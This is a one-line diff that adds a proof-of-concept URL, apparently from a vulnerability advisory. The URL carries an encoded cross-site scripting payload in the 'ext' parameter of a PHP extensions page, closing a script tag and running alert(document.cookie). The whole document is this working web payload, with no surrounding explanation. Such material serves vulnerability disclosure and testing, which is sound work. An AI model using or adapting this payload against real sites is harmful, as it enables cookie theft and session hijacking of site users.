@@ -1,0 +1,2 @@
+http://www.example.com/inc/extensions.php?mode=extensions&amp;ext=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
